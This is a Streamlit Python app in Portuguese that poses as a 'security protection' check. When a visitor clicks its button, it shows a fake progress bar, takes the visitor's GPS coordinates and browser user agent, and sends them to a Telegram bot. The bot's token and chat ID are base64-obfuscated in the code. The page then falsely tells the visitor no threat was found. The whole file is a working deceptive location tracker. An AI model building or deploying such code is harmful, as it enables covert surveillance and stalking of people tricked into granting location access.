import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA MÁXIMA (Base64) ---
# Token e ID novos já ofuscados para proteção
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# Configuração da Aba
st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# Estilo Visual (Cores da Foto)
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; margin-top: 15px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    .stButton>button {
        background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d;
        width: 100%; border-radius: 6px;
    }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'verificado' not in st.session_state:
    st.session_state.verificado = False

if not st.session_state.verificado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        # Notificação imediata de início
        enviar_telegram("📡 *SISTEMA:* Conexão iniciada com o novo dispositivo.")
        
        barra = st.progress(0)
        for i in range(1, 101):
            time.sleep(0.02)
            barra.progress(i)
        
        # Coleta de informações
        loc = get_geolocation()
        ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
        
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # Envio do relatório final
            relatorio = f"🛡️ *PROTEÇÃO ATIVADA*\n\n📍 *Local:* {mapa}\n📱 *Dispositivo:* {ua}"
            enviar_telegram(relatorio)
            
            st.session_state.verificado = True
            st.rerun()
        else:
            st.warning("⚠️ Para concluir, permita o acesso ao GPS no seu navegador.")
else:
    # VISUAL APÓS 100%
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

# Rodapé Miamy
st.markdown('<br><br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
